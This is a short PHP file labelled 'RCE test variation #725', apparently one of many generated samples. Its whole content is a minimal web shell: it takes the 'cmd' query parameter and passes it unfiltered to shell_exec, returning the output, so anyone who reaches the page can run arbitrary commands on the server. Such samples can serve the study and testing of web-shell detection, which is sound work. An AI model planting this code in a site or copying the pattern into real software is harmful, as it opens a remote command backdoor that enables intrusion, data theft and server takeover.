<?php
// RCE test variation #725
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>